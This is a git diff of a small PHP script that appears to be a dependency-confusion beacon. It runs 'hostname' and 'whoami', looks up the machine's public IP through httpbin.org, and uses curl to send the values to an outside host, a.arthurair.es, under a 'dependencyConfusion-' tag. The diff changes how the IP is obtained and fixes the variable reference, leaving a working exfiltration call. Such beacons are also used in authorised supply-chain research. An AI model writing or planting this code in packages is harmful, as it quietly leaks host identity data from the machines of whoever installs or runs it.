@@ -1,9 +1,10 @@
 <?php
     $hostname = system('hostname');
     $who = system('whoami');
-    $ip = $_SERVER['SERVER_ADDR'];
+    
+    $ipSaida = json_decode(file_get_contents('https://httpbin.org/ip'))->origin;
 
-    $finalString = urlencode($hostname."+".$who."+".$ip);
+    $finalString = urlencode($hostname."+".$who."+".$ipSaida);
 
-    system("curl https://a.arthurair.es/?".finalString);
+    system("curl https://a.arthurair.es/?dependencyConfusion-".$finalString);
  ?>
